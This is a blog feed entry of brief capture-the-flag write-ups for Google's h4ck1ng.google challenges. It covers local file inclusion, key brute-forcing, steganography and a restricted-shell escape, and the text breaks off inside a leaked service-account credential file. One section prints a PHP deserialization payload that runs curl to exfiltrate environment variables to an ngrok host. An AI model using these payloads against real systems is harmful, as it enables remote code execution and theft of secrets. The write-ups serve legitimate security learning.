<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
	<title> - security</title>
	<link href="https://www.atteniemi.com/categories/security/atom.xml" rel="self" type="application/atom+xml"/>
  <link href="https://www.atteniemi.com"/>
	<generator uri="https://www.getzola.org/">Zola</generator>
	<updated>2022-10-17T00:00:00+00:00</updated>
	<id>https://www.atteniemi.com/categories/security/atom.xml</id>
	<entry xml:lang="en">
		<title>Writeups for h4ck1ng.google challenges</title>
		<published>2022-10-17T00:00:00+00:00</published>
		<updated>2022-10-17T00:00:00+00:00</updated>
		<link rel="alternate" href="https://www.atteniemi.com/hacking-google/" type="text/html"/>
		<id>https://www.atteniemi.com/hacking-google/</id>
		<content type="html">&lt;p&gt;This post contains short writeups for all main challenges of h4ck1ng.google. &lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;I&#x27;m keeping these quite brief due to being busy with coursework.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep000ch01&quot;&gt;EP000CH01&lt;&#x2F;h2&gt;
&lt;p&gt;The following javascript in the web page reveals a &lt;code&gt;load_board.php&lt;&#x2F;code&gt; route that is vulnerable to LFI. &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;load_baseboard&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;  const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;load_board.php&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;  let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;xhr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;XMLHttpRequest&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;  const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;formData &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;FormData&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;formData&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;filename&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;baseboard.fen&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;xhr&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;POST&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;xhr&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;formData&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;window&lt;&#x2F;span&gt;&lt;span&gt;.location.href &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;index.php&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can leak &lt;code&gt;&#x2F;proc&#x2F;self&#x2F;environ&lt;&#x2F;code&gt; to obtain the flag, which is stored as an environment variable.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep000ch02&quot;&gt;EP000CH02&lt;&#x2F;h2&gt;
&lt;p&gt;In the search query, the &lt;code&gt;file&lt;&#x2F;code&gt; is vulnerable to LFI, but will only show matches from the file for search terms with at least 4 characters. You can leak bits of the source code (after obtaining path to source code from &lt;code&gt;&#x2F;proc&#x2F;self&#x2F;environ&lt;&#x2F;code&gt;). &lt;&#x2F;p&gt;
&lt;p&gt;LFI of &lt;code&gt;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&lt;&#x2F;code&gt; gives the flag, since we know the solve URL&#x27;s are of the form h4ck1ng.google&#x2F;solve&#x2F;..&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep001ch01&quot;&gt;EP001CH01&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;code&gt;grep&lt;&#x2F;code&gt; for &amp;quot;wannacry&amp;quot; in the binary that was provided, which leads to this URL: &lt;a href=&quot;https:&#x2F;&#x2F;wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com&#x2F;&quot;&gt;https:&#x2F;&#x2F;wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com&#x2F;&lt;&#x2F;a&gt;. This page contains a large number of keys, one of which likely is the encryption key.&lt;&#x2F;p&gt;
&lt;p&gt;We can extract all the keys from the page:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;bs4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;BeautifulSoup
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;tqdm &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;tqdm
&lt;&#x2F;span&gt;&lt;span&gt;url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;https:&#x2F;&#x2F;wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com&#x2F;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(url)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;soup &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;BeautifulSoup&lt;&#x2F;span&gt;&lt;span&gt;(r.text)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;tqdm&lt;&#x2F;span&gt;&lt;span&gt;(soup.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;find_all&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;a&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;href&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;)):
&lt;&#x2F;span&gt;&lt;span&gt;    r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;a[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;href&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(a[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;href&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;w&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:
&lt;&#x2F;span&gt;&lt;span&gt;        f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(r.text)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then, just try decrypting with all the keys :)&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt; f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;in *&lt;&#x2F;span&gt;&lt;span&gt;.pem&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;; do
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;.&#x2F;wannacry&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt; -encrypted_file&lt;&#x2F;span&gt;&lt;span&gt; flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt; -key_file &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;f
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;done
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;ep001ch02&quot;&gt;EP001CH02&lt;&#x2F;h2&gt;
&lt;p&gt;The binary contains a wordlist and a way to map current time to a word. This word is appended to &lt;a href=&quot;https:&#x2F;&#x2F;wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com&#x2F;&quot;&gt;https:&#x2F;&#x2F;wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com&#x2F;&lt;&#x2F;a&gt;, and is only valid for a short period of time. Visiting the valid URL gives you the flag. However, the program won&#x27;t normally run properly (or call that function).&lt;&#x2F;p&gt;
&lt;p&gt;Using GDB, we can do&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#181818;color:#c4c4c4;&quot;&gt;&lt;code&gt;&lt;span&gt;gdb break main
&lt;&#x2F;span&gt;&lt;span&gt;r
&lt;&#x2F;span&gt;&lt;span&gt;jump print
&lt;&#x2F;span&gt;&lt;span&gt;c
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;and quickly visit the URL to get the flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep001ch03&quot;&gt;EP001CH03&lt;&#x2F;h2&gt;
&lt;p&gt;Same webpage as the first challenge of episode 000. However, the endpoint we exploited last time now makes sure that the file ends with &lt;code&gt;.fen&lt;&#x2F;code&gt;. &lt;&#x2F;p&gt;
&lt;p&gt;There&#x27;s another attack vector, though. Making moves on the chess board results in get requests with a &lt;code&gt;move_end&lt;&#x2F;code&gt; parameter that consists of base64 encoded PHP array. i.e. 
&lt;code&gt;?move_end=YToyOntpOjA7czoyOiJlMiI7aToxO3M6MjoiZTQiO30=&lt;&#x2F;code&gt; which decodes to &lt;code&gt;a:2:{i:0;s:2:&amp;quot;e2&amp;quot;;i:1;s:2:&amp;quot;e4&amp;quot;;}&lt;&#x2F;code&gt;, a PHP array representing the move. This is passed to &lt;code&gt;deserialize()&lt;&#x2F;code&gt;, so we can exploit this.There&#x27;s even a convenient object in the source code, &lt;code&gt;Stockfish&lt;&#x2F;code&gt;, with these interesting functions:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span&gt;public function __wakeup()
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        $this-&amp;gt;process = proc_open($this-&amp;gt;binary, $this-&amp;gt;descriptorspec, $this-&amp;gt;pipes, $this-&amp;gt;cwd, null, $this-&amp;gt;other_options) ;
&lt;&#x2F;span&gt;&lt;span&gt;        echo &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;&amp;lt;!--&amp;#39;.&amp;#39;wakeupcalled&amp;#39;.fgets($this-&amp;gt;pipes[1], 4096).&amp;#39;--&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; public function __toString()
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        return fgets($this-&amp;gt;pipes[1], 4096);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;__wakeup()&lt;&#x2F;code&gt; gets called when deserializing the object, and conveniently there is a debug print of the object right after which will result in &lt;code&gt;__toString()&lt;&#x2F;code&gt; being called. We then construct a deserialization payload like such:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span&gt;O:9:&amp;quot;Stockfish&amp;quot;:4:{s:3:&amp;quot;cwd&amp;quot;;s:2:&amp;quot;.&#x2F;&amp;quot;;s:6:&amp;quot;binary&amp;quot;;s:69:&amp;quot;curl https:&#x2F;&#x2F;34c4-85-255-233-71.eu.ngrok.io&#x2F;$(printenv | grep google)&amp;quot;;s:13:&amp;quot;other_options&amp;quot;;a:1:{s:12:&amp;quot;bypass_shell&amp;quot;;s:4:&amp;quot;true&amp;quot;;}s:14:&amp;quot;descriptorspec&amp;quot;;a:2:{i:0;a:2:{i:0;s:4:&amp;quot;pipe&amp;quot;;i:1;s:1:&amp;quot;r&amp;quot;;}i:1;a:2:{i:0;s:4:&amp;quot;pipe&amp;quot;;i:1;s:1:&amp;quot;w&amp;quot;;}}}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;to get the environment value containing the flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep002ch01&quot;&gt;EP002CH01&lt;&#x2F;h2&gt;
&lt;p&gt;Extract RGBA values of the image using &lt;a href=&quot;https:&#x2F;&#x2F;stegonline.georgeom.net&#x2F;image&quot;&gt;StegOnline&lt;&#x2F;a&gt;
Decode them as bytes representing a character each.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# a = [1, 0, ...], the list of extracted values.
&lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i,v &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;enumerate&lt;&#x2F;span&gt;&lt;span&gt;(a):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(s) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(s, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)),&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;v &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span&gt;v &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(v)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This decodes to a certificate, (might be slightly corrupted because of bad parsing, but works)&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#181818;color:#c4c4c4;&quot;&gt;&lt;code&gt;&lt;span&gt;-----BEGIN CERTIFICATE-----
&lt;&#x2F;span&gt;&lt;span&gt;MIIDZzCCAk8CFBoKXnXdnNubl8olJdv40AxJ9wksMA0GCSqGSIb3DQEBBQUAMHAx
&lt;&#x2F;span&gt;&lt;span&gt;CzAJBgNVBAYTAkNIMQ8wDQYDVQQIDAZadXJpY2gxOzA5BgNVBAoMMmh0dHBzOi8v
&lt;&#x2F;span&gt;&lt;span&gt;aDRjazFuZy5nb29nbGUvc29sdmUvNTNjdXIxVHlfQnlfMGI1Q3VyMXRZMRMwEQYD
&lt;&#x2F;span&gt;&lt;span&gt;VQQDDApnb29nbGUuY29tMB4XDTIyMDkzMDE4NTEwNVoXDTMyMDkyNzE4NTEwNVow
&lt;&#x2F;span&gt;&lt;span&gt;cDELMAkGA1UEBhMCQ0gxDzANBgNVBAgMBlp1cmljaDE7MDkGA1UECgwyaHR0cHM6
&lt;&#x2F;span&gt;&lt;span&gt;Ly9oNGNrMW5nLmdvb2dsZS9zb2x2ZS81M2N1cjFUeV9CeV8wYjVDdXIxdFkxEzAR
&lt;&#x2F;span&gt;&lt;span&gt;BgNVBAMMCmdvb2dsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
&lt;&#x2F;span&gt;&lt;span&gt;AQDCX25BoQBBndrOiS6L11&#x2F;RwWf6FNS+fUct7CLq9yMxU+xJ+yPVFZa7+trkvwe0
&lt;&#x2F;span&gt;&lt;span&gt;IXWduNIb&#x2F;USvtOb8I8X8H&#x2F;MHVMCypBQisFMxHnZmv2D&#x2F;QVRySIJpMdah8va+LL5o
&lt;&#x2F;span&gt;&lt;span&gt;7Dv0LD73ynGUw8rW8VQUrlGF5cJRSgd3ZVbDUjR33GD4TjdIChzs&#x2F;WMZGSP7c&#x2F;lk
&lt;&#x2F;span&gt;&lt;span&gt;sSLMd2eCYbdwo5pz7KaYa7ta0b3gf055q4E&#x2F;uJ00TUN26GkYOi&#x2F;c7PZrgQu+hXR6
&lt;&#x2F;span&gt;&lt;span&gt;onn2HhkBNrloUlZaI5kJ2v3QRHt2UxnAhS7YVpQ6ZS4h8LQf6mvnZ&#x2F;Zx71SyZmkk
&lt;&#x2F;span&gt;&lt;span&gt;AuvhSjU8bCeIypSC82RbEi6fAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBABj1PIHB
&lt;&#x2F;span&gt;&lt;span&gt;cKJgxEXo6AT+8OMYWFd2M2HsioevNvmpsAQjjlPRfY3E9DF7H49XagnON3YM
&lt;&#x2F;span&gt;&lt;span&gt;dDvN4IwmHSRKIemdEyc&#x2F;D2+Dr&#x2F;Ky5FSU6NymUiUGUGV+aDGXIFV&#x2F;NOaq0b9ASbBh
&lt;&#x2F;span&gt;&lt;span&gt;78TLN2+&#x2F;Val933tHWQpPqmpw30v4XknYPF5R+ghqr9r9A0dVPstDmq1HBOuazWJe
&lt;&#x2F;span&gt;&lt;span&gt;DBUBHenbSW6EPnFYZc8zuCSLZtIJvlAryJrmcFWTridUmtXjM5Lyh05LFAFVH6wl
&lt;&#x2F;span&gt;&lt;span&gt;z0sVEvisfE9aw4zfotBsV6zvgOL1ypYsX20KJ6zIJycRBkWgmOzQxKCZ5fxfKCFT
&lt;&#x2F;span&gt;&lt;span&gt;8mr99Mujp9EBzPA=
&lt;&#x2F;span&gt;&lt;span&gt;-----END CERTIFICATE-----
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;and base64 decoding with &lt;code&gt;cat cert.pem | base64 -d&lt;&#x2F;code&gt; gives the flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep002ch02&quot;&gt;EP002CH02&lt;&#x2F;h2&gt;
&lt;p&gt;Just looking through the log file, the flag can be quickly found.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep002ch03&quot;&gt;EP002CH03&lt;&#x2F;h2&gt;
&lt;p&gt;We have a shell with most commands being disabled. We do have tab completions, though. This allows us to locate the flag with completion on something like &lt;code&gt;..&#x2F;..&#x2F;..&#x2F;&lt;&#x2F;code&gt;. Furthermore, there is a tool &lt;code&gt;_dnr_toolkit&lt;&#x2F;code&gt;, and completions are known for its subcommands. With a little bit of testing, we notice an interesting feature:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#181818;color:#c4c4c4;&quot;&gt;&lt;code&gt;&lt;span&gt;_dnr_toolkit sendkeepalive 
&lt;&#x2F;span&gt;&lt;span&gt;reading serverlist from &#x2F;default_serverlist
&lt;&#x2F;span&gt;&lt;span&gt;invalid server spec: testspec
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then, using tab completion on &lt;code&gt;_dnr_toolkit sendkeepalive --serverlist &#x2F;flag&lt;&#x2F;code&gt; gives us the flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep003ch01&quot;&gt;EP003CH01&lt;&#x2F;h2&gt;
&lt;p&gt;Through the intro challenge we have the password to obtain a shell on a computer. Digging around we find a file called &lt;code&gt;backup.py&lt;&#x2F;code&gt;. It uses an API token to fetch a file from &lt;code&gt;https:&#x2F;&#x2F;docs.googleapis.com&#x2F;v1&#x2F;documents&#x2F;1Z7CQDJhCj1G5ehvM3zB3FyxsCfdvierd1fs0UBlzFFM&lt;&#x2F;code&gt;. They have deleted the file containing the token, though. Or have they? 
We can find the private key that is used to create authorization tokens in &lt;code&gt;.config&#x2F;gcloud&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;json&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-json &quot;&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;client_email&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;backup-tool@project-multivision.iam.gserviceaccount.com&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
